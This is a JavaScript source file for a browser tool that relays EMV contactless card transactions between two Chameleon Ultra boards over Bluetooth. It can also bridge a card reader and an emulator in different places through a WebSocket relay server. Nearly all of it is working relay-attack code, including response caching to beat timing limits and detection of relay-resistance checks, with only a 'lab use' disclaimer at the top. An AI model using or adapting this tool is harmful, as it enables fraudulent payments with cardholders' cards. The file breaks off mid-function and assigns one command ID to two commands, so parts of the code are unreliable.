/*
 * relay.js -- Web Bluetooth ISO14443-4 (EMV) relay bridge for two Chameleon Ultras.
 *
 * LAB / AUTHORISED-RESEARCH USE ONLY. Relay only cards you own, against
 * terminals you own or are authorised to test.
 *
 * One browser connects to BOTH Ultras over BLE (Nordic UART Service) and
 * bridges APDUs between them -- a direct port of software/script/relay_poc.py,
 * with the TCP hop replaced by two in-browser BLE GATT connections:
 *
 *     [real card] <-RF-> MOLE (board2, reader)  ==BLE==\
 *                                                        >== this browser bridges
 *     [terminal/phone] <-RF-> GHOST (board1, tag) ==BLE=/
 *
 * Requires the relay firmware on both boards (app_version 99.x) and a
 * Web Bluetooth browser (desktop/Android Chrome or Edge; NOT iOS Safari).
 * BLE pairing is disabled on the Ultra by default, so no passkey is needed.
 */
'use strict';

const BUILD = '2026-09-08r conn-interval-fix';   // shown in the log so you can confirm which version loaded

// --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
const NUS_RX      = '6e400002-b5a3-f393-e0a9-e50e24dcca9e'; // write  (host -> device)
const NUS_TX      = '6e400003-b5a3-f393-e0a9-e50e24dcca9e'; // notify (device -> host)

const SOF = 0x11;

// --- command IDs (chameleon_enum.py) -----------------------------------------
const CMD = {
  GET_APP_VERSION: 1000,
  CHANGE_DEVICE_MODE: 1001,
  SET_ACTIVE_SLOT: 1003,
  SET_SLOT_TAG_TYPE: 1004,
  SET_SLOT_ENABLE: 1006,
  GET_GIT_VERSION: 1017,
  HF14A_4_APDU_RECV: 6000,
  HF14A_4_APDU_SEND: 6001,
  HF14A_4_SET_ANTI_COLL: 6002,
  HF14A_4_STATIC_RESP: 6003,      // add/clear static APDU response pairs (cmd_len 0 = clear)
  HF14A_4_RELAY_START: 6006,
  HF14A_4_RELAY_APDU: 6007,
  HF14A_4_RELAY_STOP: 6008,
  HF14A_4_RX_LOG: 6009,           // diagnostic: raw reader frames the ghost received
  HF14A_4_CONN_PARAMS: 6010,      // diagnostic: negotiated BLE conn params (relay latency)
  HF14A_4_SET_LED: 6010,
  HF14A_4_CARD_PROBE: 6011,
  HF14A_4_APDU_SEND_RECV: 6012,   // send response AND block for next APDU (grouped)
};
// status codes: HF_TAG_OK=0, HF_TAG_NO=1, STATUS_SUCCESS=104 (apdu_recv uses SUCCESS)
const ST = { HF_TAG_OK: 0, HF_TAG_NO: 1, SUCCESS: 104 };
const TAG_HF14A_4 = 3000; // TagSpecificType.HF14A_4
const SENSE_HF = 2;       // TagSenseType.HF
// PPSE (SELECT 2PAY.SYS.DDF01) = start of a new phone transaction
const PPSE_HEAD = hexToBytes('00A404000E325041592E5359532E44444630');

// --- byte helpers ------------------------------------------------------------
function u8(arr) { return arr instanceof Uint8Array ? arr : new Uint8Array(arr); }
function concat(...parts) {
  let n = 0; for (const p of parts) n += p.length;
  const out = new Uint8Array(n); let o = 0;
  for (const p of parts) { out.set(p, o); o += p.length; }
  return out;
}
function hex(b) {
  if (!b || !b.length) return '(empty)';
  return Array.from(b, x => x.toString(16).padStart(2, '0')).join(' ').toUpperCase();
}
function hxc(b) {  // compact hex (no spaces) for the wire
  return Array.from(b, x => x.toString(16).padStart(2, '0')).join('');
}
function hexToBytes(s) {
  s = s.replace(/\s+/g, '');
  const out = new Uint8Array(s.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(s.substr(i * 2, 2), 16);
  return out;
}
function lrc(slice) {
  let r = 0; for (const b of slice) { r = (r + b) & 0xff; }
  return (0x100 - r) & 0xff;
}
function startsWith(a, b) {
  if (a.length < b.length) return false;
  for (let i = 0; i < b.length; i++) if (a[i] !== b[i]) return false;
  return true;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// build a Chameleon command frame (matches make_data_frame_bytes)
function makeFrame(cmd, data, status = 0) {
  data = data || new Uint8Array(0);
  const len = data.length;
  const f = new Uint8Array(9 + len + 1);
  f[0] = SOF;
  f[1] = 0x00;                 // lrc1 slot
  f[2] = (cmd >> 8) & 0xff; f[3] = cmd & 0xff;
  f[4] = (status >> 8) & 0xff; f[5] = status & 0xff;
  f[6] = (len >> 8) & 0xff; f[7] = len & 0xff;
  f[8] = 0x00;                 // lrc2 slot
  f.set(data, 9);
  f[9 + len] = 0x00;           // lrc3 slot
  f[1] = lrc(f.subarray(0, 1));
  f[8] = lrc(f.subarray(0, 8));
  f[9 + len] = lrc(f.subarray(0, 9 + len));
  return f;
}

function parseAntiColl(d) {
  let o = 0;
  const ul = d[o++]; const uid = d.slice(o, o + ul); o += ul;
  const atqa = d.slice(o, o + 2); o += 2;
  const sak = d[o++];
  const al = d[o++]; const ats = d.slice(o, o + al); o += al;
  return { uid, atqa, sak, ats };
}

// --- EMV TLV helpers (for the optional static cache) -------------------------
// Collect the value bytes of every occurrence of `tag` (1- or 2-byte), recursing
// into constructed templates. Minimal, tolerant walker (card-controlled input).
function tlvFind(buf, tag) {
  const out = [];
  (function walk(b) {
    let i = 0;
    while (i < b.length) {
      const first = b[i];
      if (first === 0x00 || first === 0xff) { i++; continue; }
      let t = first, tl = 1;
      if ((first & 0x1f) === 0x1f) { if (i + 1 >= b.length) break; t = (b[i] << 8) | b[i + 1]; tl = 2; }
      i += tl; if (i >= b.length) break;
      let ln = b[i++];
      if (ln & 0x80) { let nb = ln & 0x7f; ln = 0; while (nb-- > 0 && i < b.length) ln = (ln << 8) | b[i++]; }
      const val = b.slice(i, i + ln); i += ln;
      if (t === tag) out.push(val);
      if (first & 0x20) walk(val);   // constructed
    }
  })(buf);
  return out;
}
function parseAids(fci) { return tlvFind(fci, 0x4f); }
function parseAfl(gpo) {
  let afl = new Uint8Array(0);
  const a = tlvFind(gpo, 0x94);
  if (a.length) afl = a[0];
  else { const t = tlvFind(gpo, 0x80); if (t.length && t[0].length > 2) afl = t[0].slice(2); }
  const out = [];
  for (let i = 0; i + 3 < afl.length; i += 4) out.push({ sfi: afl[i] >> 3, r1: afl[i + 1], r2: afl[i + 2] });
  return out;
}
function sw9000(r) { return r && r.length >= 2 && r[r.length - 2] === 0x90 && r[r.length - 1] === 0x00; }

// Pre-read the card's STATIC EMV flow over the mole session and return cmd->resp
// pairs to load into the ghost. Relays are live (M.relayApdu); the returned pairs
// are what the ghost then serves instantly. GENERATE AC / a real-PDOL GPO are NOT
// cached (their bytes won't match), so they fall through to live relay per tap.
async function buildStaticCache(M) {
  const pairs = [];
  const PPSE = hexToBytes('00A404000E325041592E5359532E444446303100');
  const GETDATA = [0x9f13, 0x9f17, 0x9f36, 0x9f4f, 0x9f5b, 0x9f79];
  const rly = async (apdu) => { try { const r = await M.relayApdu(apdu); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
  const fci = await rly(PPSE);
  if (!(fci.length > 2)) { log('cache: PPSE relay failed — skipping cache', 'warn'); return pairs; }
  pairs.push({ cmd: PPSE, resp: fci });
  // dedupe AIDs (a PPSE can list the same AID twice) so we don't waste cache slots
  const seenAid = new Set();
  const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seenAid.has(h)) return false; seenAid.add(h); return true; });
  log(`cache: PPSE ${fci.length}B, AIDs ${aids.map(a => hxc(a)).join(', ')}`);
  for (const aid of aids) {
    const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
    const sr = await rly(sel);
    if (!sw9000(sr)) { log(`cache: SELECT ${hxc(aid)} -> skip`, 'warn'); continue; }
    pairs.push({ cmd: sel, resp: sr });
    const gpo = hexToBytes('80A8000002830000');
    const gr = await rly(gpo);
    if (sw9000(gr)) {
      pairs.push({ cmd: gpo, resp: gr });
      for (const { sfi, r1, r2 } of parseAfl(gr)) {
        for (let rec = r1; rec <= r2 + 1; rec++) {
          const rr = u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00]);
          const rd = await rly(rr);
          if (rd.length >= 2) pairs.push({ cmd: rr, resp: rd });
        }
      }
    }
    for (const tag of GETDATA) {
      const gd = u8([0x80, 0xca, (tag >> 8) & 0xff, tag & 0xff, 0x00]);
      const rd = await rly(gd);
      if (rd.length >= 2) pairs.push({ cmd: gd, resp: rd });
    }
  }
  log(`cache: built ${pairs.length} static pairs`, 'ok');
  return pairs;
}

// --- BLE device wrapper ------------------------------------------------------
class ChameleonBLE {
  constructor(label) {
    this.label = label;
    this.device = null; this.rx = null; this.tx = null;
    this.buf = new Uint8Array(0);
    this.waiters = new Map();   // cmd -> [waiter]
    // Optimistic BLE write chunk. Chrome+nRF52 almost always negotiate an MTU
    // >=185 regardless of link speed, so big frames go in 1-2 writes instead of
    // ~13. Auto-falls back to 20 (today's behaviour) if a device negotiated the
    // 23-byte minimum MTU — see _write.
    this.mtu = 244;
    this.onDisconnect = null;
  }

  get connected() { return !!(this.device && this.device.gatt && this.device.gatt.connected); }

  async connect() {
    this.device = await navigator.bluetooth.requestDevice({
      filters: [{ namePrefix: 'Chameleon' }],
      optionalServices: [NUS_SERVICE],
    });
    this.device.addEventListener('gattserverdisconnected', () => {
      if (this.onDisconnect) this.onDisconnect();
    });
    const server = await this.device.gatt.connect();
    const svc = await server.getPrimaryService(NUS_SERVICE);
    this.rx = await svc.getCharacteristic(NUS_RX);
    this.tx = await svc.getCharacteristic(NUS_TX);
    await this.tx.startNotifications();
    this.tx.addEventListener('characteristicvaluechanged', e => this._onNotify(e.target.value));
    // handshake: prove it speaks our protocol / relay firmware
    const v = await this.sendCmd(CMD.GET_APP_VERSION);
    this.fw = v.data.length >= 2 ? `${v.data[0]}.${v.data[1]}` : '?';
    try {
      const g = await this.sendCmd(CMD.GET_GIT_VERSION);
      this.git = new TextDecoder().decode(g.data);
    } catch (_) { this.git = ''; }
    return this;
  }

  async disconnect() {
    try { if (this.device && this.device.gatt.connected) this.device.gatt.disconnect(); } catch (_) {}
  }

  _onNotify(dv) {
    const chunk = new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength);
    this.buf = concat(this.buf, chunk);
    this._parse();
  }

  _parse() {
    for (;;) {
      if (this.buf.length < 2) return;
      if (this.buf[0] !== SOF || this.buf[1] !== lrc(this.buf.subarray(0, 1))) {
        this.buf = this.buf.subarray(1); continue;
      }
      if (this.buf.length < 9) return;
      if (this.buf[8] !== lrc(this.buf.subarray(0, 8))) { this.buf = this.buf.subarray(1); continue; }
      const cmd = (this.buf[2] << 8) | this.buf[3];
      const status = (this.buf[4] << 8) | this.buf[5];
      const len = (this.buf[6] << 8) | this.buf[7];
      const total = 9 + len + 1;
      if (this.buf.length < total) return;
      if (this.buf[9 + len] !== lrc(this.buf.subarray(0, 9 + len))) { this.buf = this.buf.subarray(1); continue; }
      const data = this.buf.slice(9, 9 + len);
      this.buf = this.buf.slice(total);
      this._deliver({ cmd, status, data });
    }
  }

  _deliver(resp) {
    const q = this.waiters.get(resp.cmd);
    if (!q) return;
    while (q.length) {
      const w = q.shift();
      if (!w.done) { w.done = true; clearTimeout(w.to); w.resolve(resp); return; }
    }
  }

  sendCmd(cmd, data, timeoutMs = 4000) {
    const frame = makeFrame(cmd, data);
    if (!this.waiters.has(cmd)) this.waiters.set(cmd, []);
    const q = this.waiters.get(cmd);
    const p = new Promise((resolve, reject) => {
      const w = { done: false, resolve, to: null };
      w.to = setTimeout(() => {
        w.done = true;
        const i = q.indexOf(w); if (i >= 0) q.splice(i, 1);
        reject(new Error(`${this.label}: timeout waiting for cmd ${cmd}`));
      }, timeoutMs);
      q.push(w);
    });
    this._write(frame).catch(() => {});
    return p;
  }

  // Serialize all writes to this device: Web Bluetooth allows only one writeValue
  // in flight per characteristic, so concurrent sendCmd calls (e.g. the relay loop
  // + a Clear-cache click) otherwise collide ("GATT operation already in progress")
  // and time out. Chain every write so they go out one at a time.
  _write(frame) {
    this._writeChain = (this._writeChain || Promise.resolve())
      .catch(() => {})
      .then(() => this._writeRaw(frame));
    return this._writeChain;
  }

  async _writeRaw(frame) {
    for (;;) {
      let sent = 0;
      try {
        for (let i = 0; i < frame.length; i += this.mtu) {
          const chunk = frame.subarray(i, Math.min(i + this.mtu, frame.length));
          if (this.rx.writeValueWithoutResponse) await this.rx.writeValueWithoutResponse(chunk);
          else await this.rx.writeValue(chunk);
          sent = i + chunk.length;
        }
        return;
      } catch (e) {
        // Only shrink+retry if NOTHING was sent yet (an oversized first chunk on
        // a tiny-MTU device rejects before transmitting) — so no duplicate/garbled
        // bytes reach the device. A mid-frame failure is not an MTU issue: rethrow.
        if (sent === 0 && this.mtu > 20) { this.mtu = 20; continue; }
        throw e;
      }
    }
  }

  // --- high-level wrappers (mirror chameleon_cmd.py) -------------------------
  changeMode(reader) { return this.sendCmd(CMD.CHANGE_DEVICE_MODE, u8([reader ? 1 : 0])); }
  setActiveSlot(slot) { return this.sendCmd(CMD.SET_ACTIVE_SLOT, u8([slot - 1])); }
  setSlotTagType(slot, t) { return this.sendCmd(CMD.SET_SLOT_TAG_TYPE, u8([slot - 1, (t >> 8) & 0xff, t & 0xff])); }
  setSlotEnable(slot, sense, en) { return this.sendCmd(CMD.SET_SLOT_ENABLE, u8([slot - 1, sense, en ? 1 : 0])); }
  setAntiColl(a) {
    const p = concat(u8([a.uid.length]), a.uid, a.atqa, u8([a.sak]), u8([a.ats.length]), a.ats);
    return this.sendCmd(CMD.HF14A_4_SET_ANTI_COLL, p);
  }
  // Clear any static (cached) APDU responses on the active slot. The web app never
  // sets them, but they are flash-backed and persist, so a stray cache (e.g. from a
  // debug tool) would make the ghost answer from cache instead of relaying live.
  clearStaticResponses() { return this.sendCmd(CMD.HF14A_4_STATIC_RESP, u8([0]), 3000); }
  // Lightweight activity read: the RX ring buffer's frame counter (first byte of
  // the RX_LOG response). Increases on every RF frame the ghost receives from a
  // reader — so it climbs even when a tap is served entirely from cache (in-ISR)
  // and never reaches the host. Used to show cached-tap feedback in the portal.
  async rxCount() {
    try { const r = await this.sendCmd(CMD.HF14A_4_RX_LOG, u8([0]), 2000); return r.data.length ? r.data[0] : -1; }
    catch (_) { return -1; }
  }
  // Load one cached cmd->resp pair: cmd_len(1) cmd(n) resp_len_be16(2) resp(m).
  addStaticResponse(cmd, resp) {
    const p = concat(u8([cmd.length]), cmd, u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp);
    return this.sendCmd(CMD.HF14A_4_STATIC_RESP, p);
  }
  apduRecv() { return this.sendCmd(CMD.HF14A_4_APDU_RECV, new Uint8Array(0), 2500); }
  apduSend(resp) { return this.sendCmd(CMD.HF14A_4_APDU_SEND, concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp)); }
  // Grouped: deliver `resp` (may be empty = pure blocking recv) AND wait on-device
  // for the phone's next APDU, returned in the same round-trip. Kills the poll gap.
  // waitMs (optional) = firmware on-device block timeout; the host RTT allowance
  // is set above it so the BLE call never times out before the device returns.
  apduSendRecv(resp, waitMs) {
    let p = concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp);
    if (waitMs) p = concat(p, u8([(waitMs >> 8) & 0xff, waitMs & 0xff]));
    return this.sendCmd(CMD.HF14A_4_APDU_SEND_RECV, p, (waitMs || 600) + 1500);
  }
  async relayStart() {
    const r = await this.sendCmd(CMD.HF14A_4_RELAY_START, new Uint8Array(0), 3500);
    if (r.status === ST.HF_TAG_OK && r.data.length) r.parsed = parseAntiColl(r.data);
    return r;
  }
  relayApdu(apdu) { return this.sendCmd(CMD.HF14A_4_RELAY_APDU, apdu, 3500); }
  relayStop() { return this.sendCmd(CMD.HF14A_4_RELAY_STOP, new Uint8Array(0), 2500); }
  // Negotiated BLE connection params (relay-latency diagnostic). Returns ms, or
  // null if unsupported (older firmware) / never connected. interval is what
  // gates per-APDU latency; the central (browser/OS) chooses it, not us.
  async connParams() {
    try {
      const r = await this.sendCmd(CMD.HF14A_4_CONN_PARAMS, new Uint8Array(0), 2000);
      if (!r.data || r.data.length < 8) return null;
      const be = (i) => (r.data[i] << 8) | r.data[i + 1];
      const mx = be(2);
      if (!mx) return null;                    // 0 = never connected
      return { minMs: be(0) * 1.25, maxMs: mx * 1.25, latency: be(4), timeoutMs: be(6) * 10 };
    } catch (_) { return null; }               // command unknown on old firmware
  }
  cardProbe(force) { return this.sendCmd(CMD.HF14A_4_CARD_PROBE, u8([force ? 1 : 0]), 2500); }
  setLed(state) { return this.sendCmd(CMD.HF14A_4_SET_LED, u8([state & 0xff])); }
}

// ---------------------------------------------------------------------------
// Phase 2: WebSocket rendezvous link + remote-mole proxy
// ---------------------------------------------------------------------------
// The ghost phone talks to the remote mole phone through a room on the relay
// server. WSMole gives the ghost-side loop the same method surface as a local
// mole board, so the loop code is identical whether the mole is local or remote.
class WSLink {
  constructor() {
    this.ws = null; this.waiters = new Map(); this.onReq = null; this.onPeers = null;
    this.onClose = null; this.peers = 0; this.roles = [];
    this.hb = null;   // heartbeat interval
    this.mole = new WSMole(this);
  }
  _startHb() { this._stopHb(); this.hb = setInterval(() => this.send({ t: 'ping' }), 30000); }
  _stopHb() { if (this.hb) { clearInterval(this.hb); this.hb = null; } }
  get connected() { return !!(this.ws && this.ws.readyState === 1); }
  connect(url, room, role) {
    return new Promise((resolve, reject) => {
      let ws;
      try { ws = new WebSocket(url); } catch (e) { reject(e); return; }
      this.ws = ws;
      const to = setTimeout(() => { try { ws.close(); } catch (_) {} reject(new Error('link connect timeout')); }, 8000);
      ws.onopen = () => ws.send(JSON.stringify({ t: 'join', room, role }));
      ws.onmessage = (ev) => {
        let m; try { m = JSON.parse(ev.data); } catch { return; }
        if (m.t === 'joined') { clearTimeout(to); this.peers = m.n; this.roles = m.roles || []; this._startHb(); resolve(m); return; }
        if (m.t === 'error') { clearTimeout(to); reject(new Error('link: ' + m.reason)); return; }
        if (m.t === 'pong') return;   // heartbeat ack
        if (m.t === 'peers') { this.peers = m.n; this.roles = m.roles || []; if (this.onPeers) this.onPeers(m); return; }
        const q = this.waiters.get(m.t);
        if (q && q.length) { const w = q.shift(); clearTimeout(w.to); w.resolve(m); return; }
        if (this.onReq) this.onReq(m);   // inbound request for the mole-serve handler
      };
      ws.onerror = () => {};
      ws.onclose = () => { this._stopHb(); this.ws = null; if (this.onClose) this.onClose(); };
    });
  }
  send(obj) { if (this.connected) this.ws.send(JSON.stringify(obj)); }
  request(obj, respType, timeoutMs = 6000) {
    return new Promise((resolve, reject) => {
      if (!this.waiters.has(respType)) this.waiters.set(respType, []);
      const q = this.waiters.get(respType);
      const w = { resolve, to: setTimeout(() => { const i = q.indexOf(w); if (i >= 0) q.splice(i, 1); reject(new Error('link timeout ' + respType)); }, timeoutMs) };
      q.push(w);
      this.send(obj);
    });
  }
  close() { this._stopHb(); try { this.ws && this.ws.close(); } catch (_) {} this.ws = null; }
}

// Ghost-side view of the remote mole: same surface as a ChameleonBLE mole so the
// relay loop is transport-agnostic. changeMode/setLed are no-ops (the mole phone
// inits its own board and drives its own LED).
class WSMole {
  constructor(link) { this.link = link; }
  async changeMode() { return { status: 0 }; }
  async setLed() { return { status: 0 }; }
  async cardProbe(force) {
    const r = await this.link.request({ t: 'stat', force: !!force }, 'stat_res', 4000);
    return { status: r.present ? ST.HF_TAG_OK : ST.HF_TAG_NO };
  }
  async relayStart() {
    const r = await this.link.request({ t: 'scan' }, 'scan_res', 6000);
    if (r.uid) return { status: ST.HF_TAG_OK, parsed: { uid: hexToBytes(r.uid), atqa: hexToBytes(r.atqa), sak: r.sak, ats: hexToBytes(r.ats) } };
    return { status: ST.HF_TAG_NO };
  }
  async relayApdu(apdu) {
    const r = await this.link.request({ t: 'apdu', apdu: hxc(apdu) }, 'apdu_res', 6000);
    return { status: r.st, data: hexToBytes(r.data || '') };
  }
  async relayStop() { this.link.send({ t: 'stop' }); return { status: 0 }; }
}

// ---------------------------------------------------------------------------
// UI wiring + relay orchestration
// ---------------------------------------------------------------------------
const ghost = new ChameleonBLE('ghost');   // board1, at the terminal/phone
const mole  = new ChameleonBLE('mole');    // board2, at the card
const wsLink = new WSLink();
const currentRole = () => (document.querySelector('input[name=role]:checked') || {}).value || 'local';

// Screen wake lock: keep the screen on + tab foreground while relaying/serving.
// A web page can't run in the background (Chrome suspends it); this stops the
// phone dimming/locking, which is what suspends the loop and drops the link.
let wakeLock = null;
async function acquireWakeLock() {
  try { if ('wakeLock' in navigator && !wakeLock) { wakeLock = await navigator.wakeLock.request('screen'); wakeLock.addEventListener('release', () => { wakeLock = null; }); log('screen wake lock on (keep this tab foreground)', 'ok'); } }
  catch (_) { log('wake lock unavailable — keep the screen on manually', 'warn'); }
}
function releaseWakeLock() { try { if (wakeLock) { wakeLock.release(); wakeLock = null; } } catch (_) {} }
document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && running && !wakeLock) acquireWakeLock(); });
let running = false;
let apduCount = 0;
let rrpSeenThisRun = false;              // did the terminal send 80 EA (RRP) this session?
let rrpResolved = false;                 // badge settled to a verdict live (past GPO, no 80 EA)
let curPdol = null, curCdol1 = null;    // this card's DOL layouts (from SELECT / READ RECORD)
let curTermData = {};                    // terminal tags captured from GPO/GENERATE AC this run
let recognisedThisRun = false;           // logged a store match already this run?
let cacheCount = 0;                      // static entries currently in the ghost (host's view)
const cachedCmds = new Set();           // hex of cmds cached this session (dedupe on pre-fill load)
let clearRequested = false;             // Clear-cache asked while the relay loop is running

const $ = id => document.getElementById(id);

function setCacheStatus(note) {
  const el = $('cache-status'); if (!el) return;
  el.textContent = cacheCount > 0 ? `cache: ${cacheCount} cached${note ? ' (' + note + ')' : ''}` : 'cache: empty';
  el.style.color = cacheCount > 0 ? 'var(--green)' : 'var(--muted)';
}
function cacheReset() { cacheCount = 0; cachedCmds.clear(); setCacheStatus(); }

// Prominent RRP badge so a reader's relay-resistance is visible without scrolling.
function setRrpBadge(state) {
  const el = $('rrp-badge'); if (!el) return;
  if (state === 'enforced') { el.textContent = '⚠ READER ENFORCES RRP'; el.style.display = ''; el.style.background = '#5a1a1a'; el.style.color = '#ff9a9a'; }
  else if (state === 'watch') { el.textContent = 'RRP: watching…'; el.style.display = ''; el.style.background = '#23272f'; el.style.color = '#9aa2ad'; }
  else if (state === 'clear') { el.textContent = '✓ no RRP seen'; el.style.display = ''; el.style.background = '#153015'; el.style.color = '#8fe08f'; }
  else { el.style.display = 'none'; }
}

function log(msg, cls) {
  const el = $('log');
  const line = document.createElement('div');
  if (cls) line.className = cls;
  const t = new Date().toLocaleTimeString();
  line.textContent = `[${t}] ${msg}`;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
}

function setLedUI(who, color) {
  const dot = $(who + '-led');
  if (dot) dot.dataset.color = color;
}

function setDevUI(who, dev) {
  $(who + '-status').textContent = dev.connected ? `connected  fw ${dev.fw}${dev.git ? '  git ' + dev.git : ''}` : 'not connected';
  $(who + '-btn').textContent = dev.connected ? 'Disconnect' : 'Connect';
  $(who + '-card').classList.toggle('on', dev.connected);
  updateStartEnabled();
}

function updateStartEnabled() {
  const role = currentRole();
  let ready;
  if (role === 'local')      ready = ghost.connected && mole.connected;
  else if (role === 'ghost') ready = ghost.connected && wsLink.connected;
  else                       ready = mole.connected && wsLink.connected;   // mole
  $('start').disabled = !(ready && !running);
  $('stop').disabled = !running;
  $('start').textContent = role === 'mole' ? 'Start serving' : 'Start relay';
}

// Show only the controls relevant to the selected role.
function applyRole() {
  const role = currentRole();
  $('ghost-card').hidden = (role === 'mole');
  $('mole-card').hidden = (role === 'ghost');
  $('link-row').hidden = (role === 'local');
  $('mode-row').hidden = (role === 'mole');   // mole doesn't choose A/B; the ghost does
  updateStartEnabled();
}

// Derive the http(s) /health URL from the ws(s):// server URL.
function healthUrlFrom(wsUrl) {
  try {
    const u = new URL(wsUrl);
    u.protocol = (u.protocol === 'wss:') ? 'https:' : 'http:';
    u.pathname = '/health'; u.search = ''; u.hash = '';
    return u.toString();
  } catch { return null; }
}

// Pre-warm a sleeping Render free-tier service: poll /health until it answers.
async function wakeServer() {
  const url = healthUrlFrom($('server-url').value.trim());
  if (!url) { log('enter the relay server URL first', 'warn'); return false; }
  $('link-status').textContent = 'waking server…';
  log('waking relay server (free-tier cold start can take ~30-60s)…');
  const t0 = Date.now();
  while (Date.now() - t0 < 80000) {
    try { const r = await fetch(url, { cache: 'no-store' }); if (r.ok) { log('relay server is awake', 'ok'); $('link-status').textContent = 'server awake'; return true; } } catch (_) {}
    await sleep(3000);
  }
  log('relay server did not wake within 80s — try again', 'warn');
  $('link-status').textContent = 'wake timed out';
  return false;
}

async function toggleLink() {
  if (wsLink.connected) { wsLink.close(); return; }
  const url = $('server-url').value.trim();
  const room = $('room-code').value.trim();
  if (!url || !room) { log('enter a server URL and room code', 'warn'); return; }
  try {
    await wakeServer();   // best-effort pre-warm so the first connect doesn't cold-start-timeout
    log(`connecting to relay ${url} room "${room}" as ${currentRole()}…`);
    wsLink.onClose = () => { log('relay link closed', 'warn'); $('link-btn').textContent = 'Connect link'; $('link-status').textContent = 'not connected'; if (running) stopRelay(); updateStartEnabled(); };
    wsLink.onPeers = (m) => { $('link-status').textContent = `linked · ${m.n}/2 in room (${(m.roles || []).join(', ') || '—'})`; };
    const j = await wsLink.connect(url, room, currentRole());
    $('link-btn').textContent = 'Disconnect link';
    $('link-status').textContent = `linked · ${j.n}/2 in room`;
    log(`relay link up — ${j.n}/2 in room "${room}"`, 'ok');
    updateStartEnabled();
  } catch (e) {
    log(`link connect failed: ${e.message || e}`, 'err');
  }
}

async function toggleConnect(who) {
  const dev = who === 'ghost' ? ghost : mole;
  if (dev.connected) { await dev.disconnect(); return; }
  try {
    log(`select board for ${who.toUpperCase()} (${who === 'ghost' ? 'terminal/phone side' : 'card side'})…`);
    dev.onDisconnect = () => { log(`${who} disconnected`, 'warn'); setDevUI(who, dev); if (running) stopRelay(); };
    await dev.connect();
    log(`${who.toUpperCase()} connected: fw ${dev.fw} git ${dev.git}`, 'ok');
    if (dev.fw && !dev.fw.startsWith('99')) log(`warning: ${who} fw is ${dev.fw}, expected 99.x relay firmware`, 'warn');
    // Both boards advertise as "ChameleonUltra" and are indistinguishable in the
    // chooser — light a distinct colour so you know which physical unit is which.
    // (Transient identify only; real red/green status takes over once relaying.)
    const idColor = who === 'ghost' ? 3 : 2;       // ghost=RED, mole=BLUE
    try { await dev.setLed(idColor); } catch (_) {}
    setLedUI(who, who === 'ghost' ? 'red' : 'blue');
    log(`${who.toUpperCase()} is the board now showing ${who === 'ghost' ? 'RED' : 'BLUE'} — ` +
        `place the ${who === 'ghost' ? 'RED (ghost) at the terminal/phone' : 'BLUE (mole) at the card'}.`, 'ok');
    setDevUI(who, dev);
  } catch (e) {
    log(`${who} connect failed: ${e.message || e}`, 'err');
  }
}

async function safeProbe(dev) {
  try { const p = await dev.cardProbe(false); return p.status === ST.HF_TAG_OK; }
  catch (_) { return false; }
}

async function armGhost(anti, slot, staticPairs) {
  await ghost.setActiveSlot(slot);
  await ghost.setSlotTagType(slot, TAG_HF14A_4);
  await ghost.setSlotEnable(slot, SENSE_HF, true);
  try { await ghost.clearStaticResponses(); } catch (e) {}  // safety: never serve a stale cache
  cacheReset();
  await ghost.setAntiColl(anti);   // anti-coll BEFORE emulator mode
  if (staticPairs && staticPairs.length) {
    let n = 0;
    for (const p of staticPairs) {
      try { await ghost.addStaticResponse(p.cmd, p.resp); n++; cachedCmds.add(hxc(p.cmd)); } catch (e) {}
    }
    cacheCount = n; setCacheStatus('prefill');
    log(`loaded ${n}/${staticPairs.length} cached responses into the ghost`, 'ok');
  }
  await ghost.changeMode(false);   // tag / emulator mode
}
async function armEmulation(anti) { await ghost.setAntiColl(anti); await ghost.changeMode(false); }
async function disarmEmulation() { await ghost.changeMode(true); }

async function cloneFromMole(M, slot) {
  let warned = false;
  while (running) {
    let p;
    try { p = await M.cardProbe(true); } catch (_) { await sleep(300); continue; }
    if (p.status === ST.HF_TAG_OK) {
      // Close any session left open by a previous tap before re-opening, or the
      // stale session wedges the RC522 and the new relayStart fails (later taps
      // stop working). Guarded no-op on the firmware side if nothing is open.
      try { await M.relayStop(); } catch (_) {}
      const r = await M.relayStart();
      if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return r.parsed;
    } else {
      M.setLed(3).catch(() => {}); setLedUI('mole', 'red');
      if (!warned) { log('no card on the mole — place the card…', 'warn'); warned = true; }
    }
    await sleep(300);
  }
  return null;
}

async function startRelay() {
  if (running) return;
  const role = currentRole();
  if (role === 'mole') return startMoleServe();   // mole phone serves; the ghost phone drives
  // mole-facing side: the local board (Local mode) or the remote mole over WS (Ghost mode)
  const M = (role === 'ghost') ? wsLink.mole : mole;
  if (role === 'ghost' && !wsLink.connected) { log('not connected to the relay server', 'err'); return; }
  running = true; apduCount = 0; rrpSeenThisRun = false; rrpResolved = false; setRrpBadge('watch');
  curPdol = null; curCdol1 = null; curTermData = {}; recognisedThisRun = false;
  acquireWakeLock();
  updateStartEnabled();
  const mode = document.querySelector('input[name=mode]:checked').value;
  const gate = (mode === 'B');
  const slot = parseInt($('slot').value, 10) || 1;
  const cacheMode = ($('cache') && $('cache').value) || 'off';   // 'off' | 'prefill'
  // Adaptive poll: tight while a transaction is live (the phone is WTX-stalled
  // waiting on us, so every ms of poll gap is added latency), relaxed when idle
  // to spare BLE/CPU/battery. Safe on a slow link: the transport is strictly
  // one-command-at-a-time, so the real rate self-caps to the BLE round-trip —
  // this only removes dead time, it can't flood the connection.
  const ACTIVE_POLL = 15, IDLE_POLL = 150, ACTIVE_WINDOW = 2500;
  // Grouped-fetch on-device block: just above the phone's worst inter-APDU think
  // time (~230ms observed) so mid-transaction pre-fetch stays reliable, but the
  // end-of-transaction tail is ~this instead of the 600ms default. Tunable here.
  const GROUP_WAIT_MS = 400;
